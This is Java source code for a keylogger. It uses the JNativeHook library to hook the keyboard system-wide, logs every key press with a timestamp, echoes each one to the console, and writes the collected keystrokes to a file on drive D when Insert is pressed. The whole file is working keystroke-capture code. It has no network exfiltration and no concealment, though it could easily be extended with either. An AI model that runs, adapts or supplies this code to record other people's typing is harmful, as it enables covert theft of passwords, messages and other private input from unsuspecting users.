package main;

import java.io.File;
import java.io.FileWriter;
import java.time.format.DateTimeFormatter;  
import java.time.LocalDateTime; 
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;



public class Keylogger implements NativeKeyListener {
 String s;
    public void nativeKeyPressed(NativeKeyEvent e){
    	DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");  
    	LocalDateTime now = LocalDateTime.now();
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        s=s+"\t"+dtf.format(now)+"\n"+NativeKeyEvent.getKeyText(e.getKeyCode());

        /* Terminate program when one press INSERT */
        
        if (e.getKeyCode() == NativeKeyEvent.VC_INSERT) {
         try{
          File f = new File("D:\\keys.txt");
          FileWriter fw=new FileWriter(f);
          fw.write(s);
          fw.close();
          
         GlobalScreen.unregisterNativeHook();
         }catch(Exception ef){}
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
    //    System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    	//System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));     
    }

    public static void main(String[] args) throws Exception{
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            //System.err.println("There was a problem registering the native hook.");
            //System.err.println(ex.getMessage());
            System.exit(1);
        }

        /* Construct the example object and initialze native hook. */
        GlobalScreen.addNativeKeyListener(new Keylogger());
    }
}